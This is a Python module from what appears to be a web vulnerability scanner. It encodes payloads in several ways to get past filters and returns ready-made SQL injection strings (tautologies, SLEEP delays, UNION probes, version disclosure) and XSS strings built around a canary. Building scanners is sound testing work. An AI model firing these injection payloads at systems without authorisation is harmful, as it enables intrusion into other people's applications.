from __future__ import annotations

import base64
import importlib.resources
import urllib.parse
from pathlib import Path
from typing import Literal


EncodingType = Literal["raw", "url", "double_url", "html", "unicode", "base64"]

# HTML entity map for common injection chars
_HTML_ENTITIES: dict[str, str] = {
    "<": "&lt;",
    ">": "&gt;",
    '"': "&quot;",
    "'": "&#x27;",
    "&": "&amp;",
    "/": "&#x2F;",
}


def _html_encode(payload: str) -> str:
    return "".join(_HTML_ENTITIES.get(c, c) for c in payload)


def _unicode_encode(payload: str) -> str:
    return "".join(f"\\u{ord(c):04x}" if ord(c) > 127 or c in "<>\"'" else c for c in payload)


class PayloadEngine:
    """Load, encode, and mutate attack payloads."""

    def __init__(self, wordlists_dir: Path | None = None) -> None:
        if wordlists_dir is None:
            # Resolve relative to this package
            wordlists_dir = Path(__file__).parent.parent / "wordlists"
        self._wordlists_dir = wordlists_dir

    def load_wordlist(self, path: str) -> list[str]:
        """
        Load a wordlist file.
        `path` may be absolute or relative to the wordlists directory.
        """
        p = Path(path)
        if not p.is_absolute():
            p = self._wordlists_dir / p.name
        if not p.exists():
            return []
        lines = p.read_text(encoding="utf-8", errors="replace").splitlines()
        return [line.strip() for line in lines if line.strip() and not line.startswith("#")]

    def mutate(self, payload: str, encoding: EncodingType = "url") -> list[str]:
        """Return a list of encoded variants of the given payload."""
        variants: list[str] = [payload]  # always include raw

        if encoding == "raw" or encoding not in (
            "url",
            "double_url",
            "html",
            "unicode",
            "base64",
        ):
            return variants

        if encoding == "url":
            variants.append(urllib.parse.quote(payload, safe=""))
        elif encoding == "double_url":
            first = urllib.parse.quote(payload, safe="")
            variants.append(urllib.parse.quote(first, safe=""))
        elif encoding == "html":
            variants.append(_html_encode(payload))
        elif encoding == "unicode":
            variants.append(_unicode_encode(payload))
        elif encoding == "base64":
            variants.append(base64.b64encode(payload.encode()).decode())

        return list(dict.fromkeys(variants))  # deduplicate, preserve order

    def sqli_payloads(
        self,
        context: Literal["string", "numeric"] = "string",
        comment_style: Literal["--", "#", "/**/"] = "--",
    ) -> list[str]:
        """Return context-aware SQLi payloads."""
        c = comment_style
        if context == "string":
            return [
                f"'{c} ",
                f"'' {c} ",
                f"' OR '1'='1'{c} ",
                f"' OR 1=1{c} ",
                f"' AND '1'='1",
                f"' AND '1'='2",
                f"' AND SLEEP(5){c} ",
                f"'; SELECT SLEEP(5){c} ",
                f"' AND EXTRACTVALUE(1, CONCAT(0x7e, version())){c} ",
                f"' UNION SELECT NULL{c} ",
                f"' UNION SELECT NULL,NULL{c} ",
                f"' UNION SELECT NULL,NULL,NULL{c} ",
                "' AND 1=CONVERT(int, @@version)--",
            ]
        else:  # numeric
            return [
                f"1 OR 1=1{c} ",
                f"1 AND 1=1{c} ",
                f"1 AND 1=2{c} ",
                f"1; SELECT SLEEP(5){c} ",
                f"1 AND SLEEP(5){c} ",
                f"1 UNION SELECT NULL{c} ",
                f"1 UNION SELECT NULL,NULL{c} ",
                "1 AND 1=CONVERT(int, @@version)--",
            ]

    def xss_payloads(self, canary: str) -> list[str]:
        """Return XSS payloads embedding a unique canary string."""
        return [
            f"<script>console.log('{canary}')</script>",
            f"<img src=x onerror=\"console.log('{canary}')\">",
            f"\"><svg onload=\"console.log('{canary}')\">",
            f"javascript:alert('{canary}')",
            f"' onfocus=alert('{canary}') autofocus '",
            f"<ScRiPt>console.log('{canary}')</ScRiPt>",
            f"<scr\x00ipt>console.log('{canary}')</scr\x00ipt>",
            f"%253Cscript%253Econsole.log('{canary}')%253C%2Fscript%253E",
            f"<svg><animate onbegin=alert('{canary}') attributeName=x dur=1s>",
            f"<details open ontoggle=alert('{canary}')>",
        ]
